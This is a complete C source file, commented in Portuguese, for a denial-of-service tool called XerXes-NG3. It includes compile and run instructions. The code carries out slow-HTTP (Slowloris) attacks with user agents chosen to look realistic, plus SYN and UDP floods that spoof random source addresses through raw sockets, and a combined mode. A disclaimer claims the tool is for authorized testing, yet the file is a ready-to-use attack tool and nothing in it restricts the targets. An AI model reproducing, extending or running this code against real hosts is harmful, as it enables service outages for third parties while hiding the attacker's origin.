/*
 * XerXes-NG3 - Ferramenta de Ataque Híbrido e Multi-Vetor (SlowHTTP, SYN, UDP)
 *
 * =================================================================================
 * AVISO LEGAL E DE ÉTICA:
 *
 * ESTA FERRAMENTA FOI PROJETADA PARA FINS EDUCACIONAIS E PARA TESTES DE SEGURANÇA
 * AUTORIZADOS. USE-A APENAS EM SISTEMAS QUE VOCÊ POSSUI OU PARA OS QUAIS TEM
 * PERMISSÃO EXPLÍCITA E POR ESCRITO PARA TESTAR.
 *
 * O USO NÃO AUTORIZADO DE FERRAMENTAS DE TESTE DE ESTRESSE CONTRA REDES OU
 * SERVIDORES DE TERCEIROS É ILEGAL NA MAIORIA DAS JURISDIÇÕES E PODE RESULTAR
 * EM CONSEQUÊNCIAS LEGAIS GRAVES. OS MODOS SYN/UDP FLOOD REQUEREM PRIVILÉGIOS DE ROOT.
 *
 * O AUTOR E O PROVEDOR DESTA FERRAMENTA NÃO SE RESPONSABILIZAM POR QUALQUER
 * MAU USO OU DANO CAUSADO POR ESTE PROGRAMA.
 * =================================================================================
 *
 * Como compilar:
 * gcc -o xerxes_ng3 xerxes_ng3.c -pthread
 *
 * Como usar:
 * sudo ./xerxes_ng3 <host> <porta> <threads> <modo>
 *
 * Modos disponíveis:
 * - slowhttp : Ataque de requisição HTTP lenta (Slowloris/R.U.D.Y).
 * - synflood : Ataque de inundação SYN (Requer root).
 * - udpflood : Ataque de inundação UDP com pacotes grandes (Requer root).
 * - combo    : Executa slowhttp e synflood simultaneamente (Requer root).
 *
 * Exemplo:
 * sudo ./xerxes_ng3 example.com 80 100 combo
 * sudo ./xerxes_ng3 example.com 53 100 udpflood
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

// --- Configurações ---
#define CONNECTIONS_PER_THREAD 16 // Sockets para o modo slowhttp
#define UDP_PAYLOAD_SIZE 1024     // Tamanho do payload para o UDP flood

// Lista de User-Agents para tornar o tráfego mais realista
const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
};

const char *http_methods[] = {"GET", "POST"};

// Estrutura para passar argumentos para as threads
typedef struct {
    char *host;
    char *port;
    int thread_id;
    struct sockaddr_in target_addr;
} thread_args_t;

// Estrutura para o pseudo-cabeçalho usado no cálculo do checksum TCP
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Função para calcular o checksum (essencial para criar pacotes válidos)
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return (answer);
}

// Função para criar um socket TCP normal e conectar
int make_socket(const char *host, const char *port) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if ((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
        fprintf(stderr, "Erro em getaddrinfo: %s\n", gai_strerror(r));
        return -1;
    }
    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) continue;
        if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }
    freeaddrinfo(servinfo);
    return (p == NULL) ? -1 : sock;
}

// Função para ignorar o sinal SIGPIPE
void ignore_sigpipe(int s) {}

// --- MODO DE ATAQUE: SLOWHTTP (Slowloris/R.U.D.Y) ---
void *slowhttp_attack(void *args) {
    thread_args_t *thread_args = (thread_args_t *)args;
    char *host = thread_args->host;
    char *port = thread_args->port;
    int id = thread_args->thread_id;
    int sockets[CONNECTIONS_PER_THREAD];
    memset(sockets, 0, sizeof(sockets));

    fprintf(stderr, "[Thread %d - slowhttp]: Iniciando...\n", id);

    while (1) {
        char request_buffer[1024];
        const char *user_agent = user_agents[rand() % (sizeof(user_agents) / sizeof(char *))];
        const char *method = http_methods[rand() % (sizeof(http_methods) / sizeof(char *))];

        if (strcmp(method, "POST") == 0) {
            snprintf(request_buffer, sizeof(request_buffer),
                     "POST /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: 42\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
                     rand(), host, user_agent);
        } else {
            snprintf(request_buffer, sizeof(request_buffer),
                     "GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
                     rand(), host, user_agent);
        }

        for (int i = 0; i < CONNECTIONS_PER_THREAD; i++) {
            if (sockets[i] <= 0) {
                sockets[i] = make_socket(host, port);
                if (sockets[i] > 0 && write(sockets[i], request_buffer, strlen(request_buffer)) == -1) {
                    close(sockets[i]);
                    sockets[i] = -1;
                }
            } else {
                if (write(sockets[i], "X-a: b\r\n", 8) == -1) {
                    close(sockets[i]);
                    sockets[i] = make_socket(host, port);
                }
            }
        }
        usleep(100000 + (rand() % 200000));
    }
    free(args);
    return NULL;
}

// --- MODO DE ATAQUE: SYN FLOOD ---
void *synflood_attack(void *args) {
    thread_args_t *thread_args = (thread_args_t *)args;
    struct sockaddr_in target_addr = thread_args->target_addr;
    char datagram[4096], source_ip[32];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct pseudo_header psh;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Erro ao criar raw socket para SYN Flood. (Execute como root?)");
        free(args);
        return NULL;
    }

    fprintf(stderr, "[Thread %d - synflood]: Iniciando...\n", thread_args->thread_id);

    while (1) {
        snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
        
        iph->ihl = 5; iph->version = 4; iph->tos = 0; iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htonl(rand() % 65535); iph->frag_off = 0; iph->ttl = 255; iph->protocol = IPPROTO_TCP;
        iph->check = 0; iph->saddr = inet_addr(source_ip); iph->daddr = target_addr.sin_addr.s_addr;

        tcph->source = htons(rand() % 65535); tcph->dest = target_addr.sin_port; tcph->seq = random();
        tcph->ack_seq = 0; tcph->doff = 5; tcph->fin = 0; tcph->syn = 1; tcph->rst = 0; tcph->psh = 0;
        tcph->ack = 0; tcph->urg = 0; tcph->window = htons(5840); tcph->check = 0; tcph->urg_ptr = 0;

        psh.source_address = inet_addr(source_ip); psh.dest_address = target_addr.sin_addr.s_addr;
        psh.placeholder = 0; psh.protocol = IPPROTO_TCP; psh.tcp_length = htons(sizeof(struct tcphdr));
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = csum((unsigned short *)pseudogram, psize);
        free(pseudogram);

        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }
    close(sock);
    free(args);
    return NULL;
}

// --- MODO DE ATAQUE: UDP FLOOD ---
void *udpflood_attack(void *args) {
    thread_args_t *thread_args = (thread_args_t *)args;
    struct sockaddr_in target_addr = thread_args->target_addr;
    char datagram[sizeof(struct iphdr) + sizeof(struct udphdr) + UDP_PAYLOAD_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    char *payload = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Erro ao criar raw socket para UDP Flood. (Execute como root?)");
        free(args);
        return NULL;
    }

    // Preenche o payload com dados aleatórios uma vez
    for(int i = 0; i < UDP_PAYLOAD_SIZE; i++) {
        payload[i] = rand() % 256;
    }

    fprintf(stderr, "[Thread %d - udpflood]: Iniciando...\n", thread_args->thread_id);

    while (1) {
        char source_ip[32];
        snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);

        iph->ihl = 5; iph->version = 4; iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + UDP_PAYLOAD_SIZE;
        iph->id = htonl(rand() % 65535); iph->frag_off = 0; iph->ttl = 255; iph->protocol = IPPROTO_UDP;
        iph->check = 0; // Kernel preenche
        iph->saddr = inet_addr(source_ip); iph->daddr = target_addr.sin_addr.s_addr;
        
        udph->source = htons(rand() % 65535); udph->dest = target_addr.sin_port;
        udph->len = htons(sizeof(struct udphdr) + UDP_PAYLOAD_SIZE); udph->check = 0; // Checksum opcional no UDP

        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }
    close(sock);
    free(args);
    return NULL;
}

int main(int argc, char **argv) {
    if (argc != 5) {
        fprintf(stderr, "Uso: %s <host> <porta> <threads> <modo>\n", argv[0]);
        fprintf(stderr, "Modos: slowhttp, synflood, udpflood, combo\n");
        return 1;
    }

    char *host = argv[1];
    char *port = argv[2];
    int num_threads = atoi(argv[3]);
    char *mode = argv[4];

    if (num_threads <= 0) {
        fprintf(stderr, "O número de threads deve ser maior que zero.\n");
        return 1;
    }
    
    if (strcmp(mode, "slowhttp") != 0 && strcmp(mode, "synflood") != 0 && strcmp(mode, "udpflood") != 0 && strcmp(mode, "combo") != 0) {
        fprintf(stderr, "Modo inválido. Escolha 'slowhttp', 'synflood', 'udpflood', ou 'combo'.\n");
        return 1;
    }
    
    if ((strcmp(mode, "synflood") == 0 || strcmp(mode, "udpflood") == 0 || strcmp(mode, "combo") == 0) && getuid() != 0) {
        fprintf(stderr, "ERRO: O modo '%s' requer privilégios de root.\n", mode);
        fprintf(stderr, "Tente executar com 'sudo'.\n");
        return 1;
    }

    srand(time(NULL));
    signal(SIGPIPE, &ignore_sigpipe);

    printf("====================================================\n");
    printf("     XerXes-NG3 - Iniciando Teste de Estresse\n");
    printf("====================================================\n");
    printf("Alvo: %s:%s\n", host, port);
    printf("Threads: %d\n", num_threads);
    printf("Modo: %s\n", mode);
    printf("====================================================\n");
    printf("Pressione Ctrl+C para parar.\n\n");

    pthread_t threads[num_threads];
    struct sockaddr_in target_addr;

    // Resolve o host para modos que usam raw sockets
    if (strcmp(mode, "synflood") == 0 || strcmp(mode, "udpflood") == 0 || strcmp(mode, "combo") == 0) {
        struct hostent *he = gethostbyname(host);
        if (!he) {
            herror("gethostbyname");
            return 1;
        }
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(atoi(port));
        target_addr.sin_addr = *((struct in_addr *)he->h_addr);
    }
    
    if (strcmp(mode, "combo") == 0) {
        int slow_threads = num_threads / 2;
        int syn_threads = num_threads - slow_threads;
        printf("Modo Combo Ativado: %d threads para slowhttp, %d threads para synflood.\n\n", slow_threads, syn_threads);
        
        for (int i = 0; i < slow_threads; i++) {
            thread_args_t *args = (thread_args_t *)malloc(sizeof(thread_args_t));
            args->host = host; args->port = port; args->thread_id = i + 1;
            pthread_create(&threads[i], NULL, slowhttp_attack, (void *)args);
        }
        for (int i = 0; i < syn_threads; i++) {
            thread_args_t *args = (thread_args_t *)malloc(sizeof(thread_args_t));
            args->host = host; args->port = port; args->thread_id = i + 1 + slow_threads; args->target_addr = target_addr;
            pthread_create(&threads[i + slow_threads], NULL, synflood_attack, (void *)args);
        }
    } else {
        for (int i = 0; i < num_threads; i++) {
            thread_args_t *args = (thread_args_t *)malloc(sizeof(thread_args_t));
            args->host = host; args->port = port; args->thread_id = i + 1; args->target_addr = target_addr;

            void *(*attack_func)(void *);
            if (strcmp(mode, "slowhttp") == 0) attack_func = slowhttp_attack;
            else if (strcmp(mode, "synflood") == 0) attack_func = synflood_attack;
            else if (strcmp(mode, "udpflood") == 0) attack_func = udpflood_attack;

            if (pthread_create(&threads[i], NULL, attack_func, (void *)args) != 0) {
                perror("Falha ao criar a thread");
                free(args);
            }
            usleep(10000);
        }
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
